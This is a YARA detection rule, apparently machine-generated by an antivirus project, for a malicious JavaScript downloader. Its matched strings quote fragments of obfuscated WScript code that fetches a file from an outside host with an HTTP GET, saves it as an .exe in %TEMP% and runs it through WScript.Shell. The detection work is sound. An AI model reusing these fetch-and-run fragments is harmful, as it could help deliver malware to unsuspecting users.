rule sig_20160328_c4b86557d7098ba0565db33c4f3a24b9 {
  meta:
    description = "datamaliciousorder - file 20160328_c4b86557d7098ba0565db33c4f3a24b9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "76876d3ee5cdd991395f1e7dad5452719e876f1de951ece2c65c016889e89fd0"

  strings:
    $s1  = "function Alqxbipzju() {return Gwkujcqajo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"4iSR1n3goFY2.exe\";};" fullword ascii
    $s2  = "Jooxo[Isjvouoj](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Nizmrzjad](Itdeuviui() * 11)} while (Jooxo[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Fujir(Ijbzhu, Kcngcqx){return Ijbzhu - Kcngcqx;};" fullword ascii
    $s5  = "var Gwkujcqajo = function Jepmnzt() {return WScript[Qodxnuhwhj](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Akpup(Ubeod){Gwkujcqajo[\"Run\"](Ubeod, Qbprmlcpg, Qbprmlcpg);};" fullword ascii
    $s7  = "function Owukgs() {return ((Cknltpj == true) && (Cknltpj == Efivj)) ? 1 : Qbprmlcpg;};" fullword ascii
    $s8  = "function Tplllx(Kvgbz) {var Tdfxzg = (1, 2, 3, 4, 5, Kvgbz); return Tdfxzg;};" fullword ascii
    $s9  = "var Cknltpj = false;" fullword ascii
    $s10 = "function Hifhpxaj(){return Qdlzo;};" fullword ascii
    $s11 = "Cknltpj = true; " fullword ascii
    $s12 = "var Efivj = false;" fullword ascii
    $s13 = "function Cxdrwja()" fullword ascii
    $s14 = " while (Qlvaf){" fullword ascii
    $s15 = "var Gyxywuen = new this[\"Date\"]();" fullword ascii
    $s16 = "function Itdeuviui(){return 22;};" fullword ascii
    $s17 = "return Fujir(Gvnsezx, Vzyrlxcb);" fullword ascii
    $s18 = "var Buwuho = false;" fullword ascii
    $s19 = "Efivj = true; " fullword ascii
    $s20 = "function Wsmdn(){return Qodxnuhwhj;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}